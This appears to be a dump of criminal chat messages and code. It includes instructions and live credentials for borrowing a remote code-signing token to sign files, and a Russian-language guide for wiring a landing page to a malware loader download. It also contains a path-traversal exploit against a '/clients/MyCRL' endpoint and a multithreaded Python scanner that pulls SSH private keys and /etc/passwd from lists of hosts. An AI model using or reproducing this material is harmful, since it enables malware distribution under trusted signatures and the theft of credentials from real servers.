CodeSigning Guru, [4 июня 2024 г., 19:11:38]:
1. Download and install Yubikey Smartcard Minidriver (https://www.yubico.com/support/download/smart-card-drivers-tools/) and Yubikey Manager (https://www.yubico.com/support/download/yubikey-manager/)

2. Download Virtualhere client: https://www.virtualhere.com/usb_client_software

3. Launch Virtualhere client.
Right click on USB servers => Specify server => Add.
Enter:  MHLuYeyYTAxQ6579mg15NS-5TcAT7
Save.

4. A list of tokens should appear within 20-30 seconds.
You need Token20, double click to connect.
Password: nkl1km*dc9S
Token PIN: 123456

5. Launch Yubikey Manager and check if the token is visible.

6. Disconnect and reconnect the token once again.

7. Now you can sign your files with signtool.exe

Подпись с помощью signtool:
signtool.exe sign /sha1 <certificate thumbprint> /tr http://timestamp.digicert.com /td SHA256 /fd SHA256 <file to be signed>

Значение thumbprint можно найти в свойствах сертификата на вкладке Состав в поле Отпечаток.

[2024-06-04 17:48:27] @usernamegg:matrix.bestflowers247.online: ```
что нужно для работы с нами

1. 2 домена на хосте, один под ваш софт, второй под мсих файлы (готовые).

2. Отключить IPv6, мы с ним не работаем.

3. Интеграция на ленд
1. папку download положить в корень сайта.
файл dwnl.php должен быть доступен по адресу https://ваш_сайт.com/download/dwnl.php
2. На ленде.
Между тегами <head> и </head> вставить скрипт
<script>function loadlink(){window.location.href='./download/dwnl.php';} </script>
3. На ленде.
Поменять ссылку на кнопке скачивания на
href="javascript: void(0);" onclick="loadlink();"

файл dwnl.php пришлем чуть позже

4. Если отдача вашего софта не через РанПЕ, то мы принимаем софт в формате контейнера (Kleopatra).

Открываешь клеопатру, кидаешь туда файл или папку
https://prnt.sc/ED4LlSy2D7vM
нажимаем подписать
https://prnt.sc/WJ5-jc1Kv3Hx
вводим пасс
riudswrk
https://prnt.sc/FjNQvG8tlorY
создается файл
https://prnt.sc/GD4oqyPi7Rty
его кладем на хост и линк используется в лодере (линк прислать нам)

клеопатра входит в комплект Gpg4win
https://gpg4win.org/
```

def check_vulnerability(ip, file_name="etc/passwd"):
# Try different curl commands with various SSL options
commands = [
# Disable SSL verification
f"curl -i -s -k -X POST \
-H 'Host: {ip}' \
-H 'Content-Length: 39' \
--data-binary 'aCSHELL/../../../../../../../{file_name}' \
'https://{ip}/clients/MyCRL'",

# Specify SSL version (TLSv1.2)
f"curl -i -s -k -X POST \
-H 'Host: {ip}' \
-H 'Content-Length: 39' \
--data-binary 'aCSHELL/../../../../../../../{file_name}' \
--tlsv1.2 \
'https://{ip}/clients/MyCRL'"
```

import threading
import logging

import base64
import random
import string
import requests
import argparse
parser = argparse.ArgumentParser(description='')
parser.add_argument('-output',default='output.txt')
parser.add_argument('-computers',default='pc.txt')
parser.add_argument('-threads',default=10)
args = parser.parse_args()

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, filename=args.output,filemode="w")


def send_exploit_request(target, file_to_dump):
base_url = target + "/clients/MyCRL"
file_data = "aCSHELL/../../../../../../.." + file_to_dump

headers = {
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
"Accept": "text/html,application/xhtml+xml,application/xml;q=0vURAHC*HT%&ngv43g5vhIug1.9,image/avif,image/webp,*/*;q=0.8",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate, br",
"Upgrade-Insecure-Requests": "1",
"Sec-Fetch-Dest": "document",
"Sec-Fetch-Mode": "navigate",
"Sec-Fetch-Site": "none",
"Sec-Fetch-User": "?1",
"Dnt": "1",
"Sec-Gpc": "1",
"Te": "trailers",
"Connection": "close"
}

responsed = requests.post(base_url, data=file_data, headers=headers, verify=False)
return responsed

def targetRun(scheme, host, port):
# logging.info("[-] Sending payload to target for checking...")
# scheme, host, port, path, query = UrlParse.split_url(target_entity.get_url())
if port == None:
if scheme == "https":
port = "443"
else:
port = "80"
target = scheme + "://" + host + ":" + port
file_to_dump = "/home/admin/.ssh/id_rsa"
# logging.info(f"[-] Sending payload to {target} for checking...")
try:
response = send_exploit_request(target, file_to_dump)
if response.status_code == 200:
logging.info("[+] Vulnerable: " + target)
logging.info("[+] Got response: " + response.text)
else:
return
# logging.info("[-] Not vulnerable: " + target)
except Exception as e:
return
# logging.info("Error sending request in post_request." + str(e))
# raise SkipAttackException

fComputers = open(args.computers, 'r')
computers = fComputers.read().splitlines()
globalLock = threading.Lock()
processedComputers = 0
totalComputers = len(computers)
def Process(computerList):
global processedComputers
global outputDict
while totalComputers != processedComputers:
globalLock.acquire()
if totalComputers == processedComputers:
# print(f'{totalComputers} == {processedComputers}')
globalLock.release()
return
currentComputerName = computerList[processedComputers]
processedComputers+=1
globalLock.release()
try:
tokens = currentComputerName.split(':')
targetRun("https", tokens[0], tokens[1])
except Exception as e:
continue


#logging.info("[-] Not vulnerable: " + target)

threads = []
for threadId in range(0, int(args.threads)):
t = threading.Thread(target=Process, args=(computers,))
t.start()
threads.append(t)

for thread in threads:
thread.join()
